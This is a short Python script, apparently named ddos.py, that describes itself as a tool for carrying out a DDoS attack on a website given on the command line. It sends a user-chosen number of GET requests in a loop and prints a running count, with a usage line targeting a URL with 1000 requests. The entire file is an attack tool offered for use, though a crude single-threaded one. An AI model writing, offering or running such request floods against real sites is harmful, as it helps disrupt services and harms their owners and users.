#This script carries out a DDOS attack on a website provided by user.
#It uses the requests module to send a GET request to the website.

import requests
import sys

#The URL of the website to be attacked
url = sys.argv[1]

#The number of requests to be sent
num_requests = int(sys.argv[2])

#send requests
for i in range(num_requests):
    requests.get(url)
    #print response from url
    print("Request sent")
    #print the number of requests sent
    print(i+1)
    #print the number of requests remaining
    print(num_requests-i-1)



#The script can be run from the command line as follows:
#python ddos.py http://www.example.com 1000

